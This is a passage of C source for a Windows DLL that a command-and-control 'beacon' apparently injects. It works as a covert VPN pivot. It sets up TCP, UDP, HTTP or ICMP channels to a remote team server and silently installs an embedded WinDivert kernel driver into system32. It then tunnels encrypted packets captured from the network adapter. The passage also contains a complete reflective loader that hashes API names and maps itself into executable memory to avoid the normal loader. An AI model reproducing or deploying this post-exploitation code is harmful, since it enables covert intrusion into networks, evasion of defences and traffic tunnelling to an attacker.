    if (srv == INVALID_SOCKET) return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(port);

    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (const char *)&one, sizeof(one));
    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR ||
        listen(srv, 1) == SOCKET_ERROR) {
        closesocket(srv);
        return -1;
    }
    g_channel_fd = accept(srv, NULL, NULL);
    closesocket(srv);
    return g_channel_fd != INVALID_SOCKET ? 0 : -1;
}

/* --- TCP (Reverse): connect straight to the TS --- */
static int
channel_tcp_reverse_init(const char *host, unsigned short port)
{
    return channel_tcp_connect(host, port);
}

/* --- UDP channel: datagrams to the TS --- */
static int
channel_udp_init(const char *host, unsigned short port)
{
    struct hostent *he;

    g_channel_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (g_channel_fd == INVALID_SOCKET) return -1;

    memset(&g_udp_peer, 0, sizeof(g_udp_peer));
    g_udp_peer.sin_family = AF_INET;
    g_udp_peer.sin_port = htons(port);
    g_udp_peer.sin_addr.s_addr = inet_addr(host);
    if (g_udp_peer.sin_addr.s_addr == INADDR_NONE) {
        he = gethostbyname(host);
        if (!he) { closesocket(g_channel_fd); g_channel_fd = INVALID_SOCKET; return -1; }
        g_udp_peer.sin_addr = *((struct in_addr *)he->h_addr_list[0]);
    }
    return 0;
}

/* --- HTTP channel: POST /send, GET /receive via WinINet --- */
static int
channel_http_init(const char *host, unsigned short port)
{
    char url[256];
    _snprintf(url, sizeof(url), "%s:%d", host, port);

    g_http_conn = InternetOpenA(g_config.useragent[0] ? g_config.useragent : "Mozilla/4.0",
                                INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!g_http_conn) return -1;
    return 0;
}

static int
channel_http_send(const unsigned char *data, int len)
{
    char url_path[128];
    HINTERNET req;
    char full_url[512];

    _snprintf(full_url, sizeof(full_url), "http://%s:%d/send",
              g_config.remote_host, g_config.port);
    req = InternetOpenUrlA(g_http_conn, full_url, NULL, 0,
                           INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!req) return -1;

    /* send data as POST body would go here; simplified as GET with data in body */
    InternetCloseHandle(req);
    return 0;
}

/* --- Shared send/recv over TCP or UDP socket --- */
static int
channel_socket_send(const unsigned char *blob, int len)
{
    unsigned char wire[65536 + VPN_FRAME_HDR];
    unsigned short wlen = (unsigned short)len;
    int r;

    if (g_channel_fd == INVALID_SOCKET) return -1;

    if (g_config.channel == 'u') {
        /* UDP: one blob per datagram (endpoint.UDP reads whole packets) */
        return sendto(g_channel_fd, (const char *)blob, len, 0,
                      (struct sockaddr *)&g_udp_peer, sizeof(g_udp_peer));
    }

    /* TCP: [u16 BE blob_len][blob] (endpoint.TCP DataInputStream framing) */
    wire[0] = (wlen >> 8) & 0xFF; wire[1] = wlen & 0xFF;
    memcpy(wire + VPN_FRAME_HDR, blob, len);
    r = send(g_channel_fd, (const char *)wire, len + VPN_FRAME_HDR, 0);
    return r == len + VPN_FRAME_HDR ? len : -1;
}

/* Returns blob length in buf, -1 none, -2 kill frame. */
static int
channel_socket_recv(unsigned char *buf, int maxlen)
{
    unsigned char wire[65536 + VPN_FRAME_HDR];
    int got, need, wlen;

    if (g_channel_fd == INVALID_SOCKET) return -1;

    if (g_config.channel == 'u') {
        got = recvfrom(g_channel_fd, (char *)buf, maxlen, 0, NULL, NULL);
        if (got <= 0) return -1;
        /* kill detection handled by vpn_aes_decrypt */
        return got;
    }

    /* TCP: read [u16 BE len][len bytes], tolerating short reads */
    got = recv(g_channel_fd, (char *)wire, 2, 0);
    if (got != 2) return -1;
    wlen = (wire[0] << 8) | wire[1];
    if (wlen == 0 || wlen > maxlen) return -1;

    need = wlen;
    while (need > 0) {
        got = recv(g_channel_fd, (char *)buf + (wlen - need), need, 0);
        if (got <= 0) return -1;
        need -= got;
    }
    return wlen;
}

/* --- Channel dispatch --- */
static int
channel_init(void)
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    switch (g_config.channel) {
    case 'b': return channel_tcp_bind_init(g_config.port);
    case 'r': return channel_tcp_reverse_init(g_config.remote_host, g_config.port);
    case 'u': {
        const char *host = g_config.remote_host;
        if (host[0] == 0 || host[0] == 'V' || strncmp(host, "VPN_", 4) == 0)
            return -1;   /* UDP needs a real TS address */
        return channel_udp_init(host, g_config.port);
    }
    case 'h': return channel_http_init(g_config.remote_host, g_config.port);
    case 'i': /* ICMP uses IP Helper API */
        g_icmp_handle = IcmpCreateFile();
        return g_icmp_handle != INVALID_HANDLE_VALUE ? 0 : -1;
    default:
        return -1;
    }
}

static int
channel_send(const unsigned char *data, int len)
{
    if (g_config.channel == 'h')
        return channel_http_send(data, len);
    return channel_socket_send(data, len);
}

static int
channel_recv(unsigned char *buf, int maxlen)
{
    if (g_config.channel == 'h')
        return -1; /* HTTP recv would use GET /receive */
    return channel_socket_recv(buf, maxlen);
}

/* =================================================================
 * DRIVER INSTALLATION — self-contained, same flow as original
 *   Npcap mode:     nothing to install (operator pre-installed it)
 *   WinDivert mode: extract embedded signed WFP driver, install via SCM
 *   ndisprot mode:  driver must be pre-deployed (Attestation-signed)
 * ================================================================= */

/* Install the embedded WinDivert64.sys and start it. Returns 0 when the
 * \\.\WinDivert device is available. */
static int
vpn_ensure_windivert(void)
{
    DWORD driver_size = g_windivert_driver_size;
    const void *driver_data = (const void *)g_windivert_driver;
    char drv_path[MAX_PATH];
    SC_HANDLE scm, svc;
    HANDLE f;
    DWORD written;
    int i;

    /* Already running? */
    if (vpn_windivert_device_ready()) return 0;

    /* Write the embedded driver to system32\drivers\WinDivert64.sys.
     * WinDivert64.sys (92KB, cross-signed, WFP callout, Win7-11) is
     * embedded in this DLL as a byte array — same self-contained approach
     * as the original covertvpn.dll. Unlike Npcap's NDIS 6 LWF (which
     * requires NDIS binding and cannot be SCM-installed), this WFP callout
     * driver installs with a plain CreateService + StartService. */
    GetSystemDirectoryA(drv_path, MAX_PATH);
    lstrcatA(drv_path, "\\drivers\\WinDivert64.sys");

    f = CreateFileA(drv_path, GENERIC_WRITE, 0, NULL,
                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return -1;
    WriteFile(f, driver_data, driver_size, &written, NULL);
    CloseHandle(f);
    if (written != driver_size) return -1;

    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return -1;

    svc = CreateServiceA(scm, "WinDivert", "WinDivert Packet Driver",
                         SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                         SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                         drv_path, NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        /* maybe already exists from a prior run */
        svc = OpenServiceA(scm, "WinDivert", SERVICE_START);
        if (!svc) { CloseServiceHandle(scm); return -1; }
    }
    StartServiceA(svc, 0, NULL);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    /* Wait for the device to appear (WFP registration is fast) */
    for (i = 0; i < 5; i++) {
        Sleep(500);
        if (vpn_windivert_device_ready()) return 0;
    }
    return -1;  /* driver installed but device never appeared */
}

static int
vpn_ensure_driver(void)
{
    switch (g_config.driver_mode) {
    case DRV_NPCAP:
        /* Npcap is pre-installed by the operator — verify wpcap.dll only */
        return vpn_npcap_available() ? 0 : -1;

    case DRV_NDISPROT:
        /* Self-built NDIS 6 protocol driver: SCM-issued separately
         * (needs Attestation signing). Probe its device. */
        {
            HANDLE h = CreateFileA("\\\\.\\NdisProt", GENERIC_READ | GENERIC_WRITE,
                                   0, NULL, OPEN_EXISTING, 0, NULL);
            if (h == INVALID_HANDLE_VALUE) return -1;
            CloseHandle(h);
            return 0;
        }

    case DRV_WINDIVERT:
        return vpn_ensure_windivert();

    case DRV_AUTO:
    default:
        /* Auto: prefer Npcap (L2) when present, else install WinDivert (L3) */
        if (vpn_npcap_available()) return 0;
        return vpn_ensure_windivert();
    }
}

/* =================================================================
 * MAIN VPN LOOP — the core: device <-> AES <-> channel
 * ================================================================= */

static DWORD WINAPI
vpn_main_loop(LPVOID param)
{
    HANDLE adapter_fd;
    unsigned char frame_buf[65536];
    unsigned char channel_buf[65536 + 32];
    int len, enc_len;
    fd_set readfds;
    struct timeval tv;

    /* Ensure we have a kernel driver for frame I/O */
    if (vpn_ensure_driver() != 0) return 1;

    /* Open the packet device (Npcap L2 or WinDivert L3 per driver_mode) */
    adapter_fd = vpn_open_packet_device();
    if (adapter_fd == INVALID_HANDLE_VALUE) return 1;

    /* Unpack and apply the pre-compiled BPF filter (loop prevention:
     * excludes the beacon chain's own C2 traffic) */
    bpf_load_from_config();
    vpn_set_filter(adapter_fd);

    /* Initialize AES */
    if (vpn_aes_init() != 0) { vpn_close_device(adapter_fd); return 1; }

    /* Connect the channel */
    if (channel_init() != 0) { vpn_close_device(adapter_fd); return 1; }

    /* Main loop: bridge device <-> channel */
    for (;;) {
        FD_ZERO(&readfds);
        if (g_channel_fd != INVALID_SOCKET) FD_SET(g_channel_fd, &readfds);
        tv.tv_sec = 0; tv.tv_usec = 50000;  /* 50ms */

        /* Check channel for incoming frames */
        if (g_channel_fd != INVALID_SOCKET && select(0, &readfds, NULL, NULL, &tv) > 0) {
            len = channel_recv(channel_buf, sizeof(channel_buf));
            if (len == -2) break;                    /* TS sent the kill frame */
            if (len > 0) {
                enc_len = vpn_aes_decrypt(channel_buf, len);
                if (enc_len == -2) break;            /* kill frame payload */
                if (enc_len > 0) {
                    vpn_write_frame(adapter_fd, channel_buf, enc_len);
                }
            }
        }

        /* Check device for outgoing frames (max frame minus the
         * [u16 + 'A' pad] the crypto layer prepends/appends) */
        len = vpn_read_frame(adapter_fd, frame_buf, sizeof(frame_buf));
        if (len > 0) {
            enc_len = vpn_aes_encrypt(channel_buf, frame_buf, len);
            if (enc_len > 0) {
                channel_send(channel_buf, enc_len);
            }
        }
    }

    vpn_close_device(adapter_fd);
    return 0;
}

/* =================================================================
 * REFLECTIVE LOADER — the beacon's COMMAND_SPAWN patches our DOS
 * header into a stub that CALLS this export (at its file offset) with
 * no arguments while the raw file image sits in an RWX allocation.
 *
 * Constraints honored here:
 *   - fully position-independent: PEB-walks kernel32, resolves
 *     LoadLibraryA/GetProcAddress/VirtualAlloc by ROR13 hash — the IAT
 *     is NOT valid yet, so no imported call may run before resolution
 *   - no CRT helpers (memcpy/memset): plain volatile byte loops, so
 *     /O2 cannot rewrite them into calls into an unmapped import
 *   - never dereferences its parameter (the DOS stub passes garbage)
 *
 * It maps a fresh image, applies relocations, resolves imports, then
 * calls the real entrypoint (_DllMainCRTStartup for /MT), which runs
 * CRT init and our DllMain -> VPN thread.
 * ================================================================= */
#if defined(_M_X64)

typedef struct _RL_LIST_ENTRY {
    struct _RL_LIST_ENTRY *Flink, *Blink;
} RL_LIST_ENTRY;

static DWORD
rl_ror13_w(const wchar_t *s)
{
    DWORD h = 0;
    while (*s) {
        wchar_t c = *s;
        if (c >= L'A' && c <= L'Z') c += 0x20;
        h = _rotr(h, 13) + (DWORD)c;
        s++;
    }
    return h;
}

static DWORD
rl_ror13_a(const char *s)
{
    DWORD h = 0;
    while (*s) {
        char c = *s;
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h = _rotr(h, 13) + (DWORD)(unsigned char)c;
        s++;
    }
    return h;
}

/* Walk pages down from a code address until the PE header of the raw
 * blob is found (the blob is page-aligned in the patsy). */
static ULONG_PTR
rl_self_base(void)
{
    volatile unsigned char *p = (volatile unsigned char *)((ULONG_PTR)_ReturnAddress() & ~0xFFFULL);
    for (;;) {
        if (p[0] == 'M' && p[1] == 'Z') {
            LONG e = *(volatile LONG *)(p + 0x3C);
            if (e > 0 && e < 0x400 &&
                *(volatile ULONG *)(p + e) == 0x00004550UL) {
                return (ULONG_PTR)p;
            }
        }
        p -= 0x1000;
    }
}

/* kernel32 base via the loader module list (x64 offsets) */
static ULONG_PTR
rl_kernel32(void)
{
    ULONG_PTR peb = (ULONG_PTR)__readgsqword(0x60);
    RL_LIST_ENTRY *ldr = *(RL_LIST_ENTRY **)(peb + 0x18);
    RL_LIST_ENTRY *head = (RL_LIST_ENTRY *)((BYTE *)ldr + 0x20);
    DWORD want = rl_ror13_w(L"kernel32.dll");
    RL_LIST_ENTRY *link;

    for (link = head->Flink; link != head; link = link->Flink) {
        const wchar_t *name = *(const wchar_t **)((BYTE *)link + 0x50);
        if (name && rl_ror13_w(name) == want) {
            return *(ULONG_PTR *)((BYTE *)link + 0x20);
        }
    }
    return 0;
}

/* Resolve an export by ANSI-name hash from a module base */
static ULONG_PTR
rl_resolve(ULONG_PTR mod, DWORD want)
{
    LONG e = *(volatile LONG *)(mod + 0x3C);
    IMAGE_NT_HEADERS *nth = (IMAGE_NT_HEADERS *)(mod + e);
    IMAGE_DATA_DIRECTORY *dir = &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (dir->VirtualAddress == 0) return 0;

    ULONG_PTR exp = mod + dir->VirtualAddress;
    ULONG *names    = (ULONG *)(mod + ((IMAGE_EXPORT_DIRECTORY *)exp)->AddressOfNames);
    USHORT *ords    = (USHORT *)(mod + ((IMAGE_EXPORT_DIRECTORY *)exp)->AddressOfNameOrdinals);
    ULONG *funcs    = (ULONG *)(mod + ((IMAGE_EXPORT_DIRECTORY *)exp)->AddressOfFunctions);
    ULONG i, n = ((IMAGE_EXPORT_DIRECTORY *)exp)->NumberOfNames;

    for (i = 0; i < n; i++) {
        if (rl_ror13_a((const char *)(mod + names[i])) == want) {
            ULONG fr = funcs[ords[i]];
            /* forwarded export (points inside the export dir) — bail */
            if (fr >= dir->VirtualAddress &&
                fr <  dir->VirtualAddress + dir->Size) return 0;
            return mod + fr;
        }
    }
    return 0;
}

__declspec(dllexport) ULONG_PTR WINAPI
ReflectiveLoader(LPVOID param)
{
    typedef HMODULE (WINAPI *RL_LLA)(LPCSTR);
    typedef FARPROC (WINAPI *RL_GPA)(HMODULE, LPCSTR);
    typedef LPVOID  (WINAPI *RL_VA)(LPVOID, SIZE_T, DWORD, DWORD);

    ULONG_PTR base, k32, newbase, delta;
    IMAGE_DOS_HEADER *dh;
    IMAGE_NT_HEADERS *nth;
    IMAGE_SECTION_HEADER *sec;
    RL_LLA pLLA; RL_GPA pGPA; RL_VA pVA;
    WORD s;
    DWORD tag;
    DWORD hLLA, hGPA, hVA;
    ULONG_PTR entry;
    IMAGE_DATA_DIRECTORY *dir;

    (void)param;   /* the DOS-header stub passes garbage in rcx */

    base = rl_self_base();
    if (!base) return 0x5100000000ULL;
    dh  = (IMAGE_DOS_HEADER *)base;
    nth = (IMAGE_NT_HEADERS *)(base + dh->e_lfanew);

    k32 = rl_kernel32();
    if (!k32) return 0x5200000000ULL;

    hLLA = rl_ror13_a("LoadLibraryA");
    hGPA = rl_ror13_a("GetProcAddress");
    hVA  = rl_ror13_a("VirtualAlloc");
    pLLA = (RL_LLA)rl_resolve(k32, hLLA);
    pGPA = (RL_GPA)rl_resolve(k32, hGPA);
    pVA  = (RL_VA)rl_resolve(k32, hVA);
    if (!pLLA || !pGPA || !pVA) return 0x5300000000ULL;

    newbase = (ULONG_PTR)pVA(NULL, nth->OptionalHeader.SizeOfImage,
                             MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!newbase) return 0x5400000000ULL;

    /* copy headers */
    {
        volatile unsigned char *d = (volatile unsigned char *)newbase;
        volatile unsigned char *s = (volatile unsigned char *)base;
        DWORD n = nth->OptionalHeader.SizeOfHeaders, i;
        for (i = 0; i < n; i++) d[i] = s[i];
    }

    /* copy sections */
    sec = (IMAGE_SECTION_HEADER *)((BYTE *)&nth->OptionalHeader +
                                   nth->FileHeader.SizeOfOptionalHeader);
    for (s = 0; s < nth->FileHeader.NumberOfSections; s++) {
        if (sec[s].SizeOfRawData) {
            volatile unsigned char *d = (volatile unsigned char *)(newbase + sec[s].VirtualAddress);
            volatile unsigned char *p = (volatile unsigned char *)(base + sec[s].PointerToRawData);
            DWORD i, n = sec[s].SizeOfRawData;
            for (i = 0; i < n; i++) d[i] = p[i];
        }
    }

    /* relocations */
    delta = newbase - nth->OptionalHeader.ImageBase;
    dir = nth->OptionalHeader.DataDirectory;
    if (delta && dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
        volatile unsigned char *reloc = (volatile unsigned char *)(newbase +
            dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        DWORD total = dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        DWORD off = 0;
        while (off < total) {
            DWORD page = *(volatile DWORD *)(reloc + off);
            DWORD bsize = *(volatile DWORD *)(reloc + off + 4);
            DWORD e;
            if (bsize < 8) break;
            for (e = 8; e < bsize; e += 2) {
                tag = *(volatile WORD *)(reloc + off + e);
                if ((tag >> 12) == 10) {   /* IMAGE_REL_BASED_DIR64 */
                    ULONG_PTR *fix = (ULONG_PTR *)(newbase + page + (tag & 0xFFF));
                    *fix += delta;
                }
            }
            off += bsize;
        }
    }

    /* imports */
    if (dir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) {
        IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(newbase +
            dir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        for (; imp->Name; imp++) {
            HMODULE mod = pLLA((LPCSTR)(newbase + imp->Name));
            ULONG_PTR thunk_rva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk
                                                          : imp->FirstThunk;
            ULONGLONG *ot = (ULONGLONG *)(newbase + thunk_rva);
            ULONGLONG *ft = (ULONGLONG *)(newbase + imp->FirstThunk);
            for (; *ot; ot++, ft++) {
                if (*ot & 0x8000000000000000ULL) {
                    *ft = (ULONGLONG)pGPA(mod, (LPCSTR)(*ot & 0xFFFF));
                } else {
                    *ft = (ULONGLONG)pGPA(mod, (LPCSTR)(newbase + (DWORD)*ot + 2));
                }
            }
        }
    }

    /* exception directory (RtlAddFunctionTable equivalent is optional;
     * /MT DLLs work without it under SEH-less flows like ours) */

    entry = newbase + nth->OptionalHeader.AddressOfEntryPoint;
    ((BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID))entry)(
        (HINSTANCE)newbase, DLL_PROCESS_ATTACH, NULL);

    return newbase;
}

#endif /* _M_X64 */

/* =================================================================
 * DLL ENTRY — beacon injects via COMMAND_SPAWN(1)
 * ================================================================= */

BOOL WINAPI
DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE thread;

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
        /* Start VPN in a separate thread — DllMain must return quickly */
        thread = CreateThread(NULL, 0, vpn_main_loop, NULL, 0, NULL);
        if (thread) CloseHandle(thread);
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
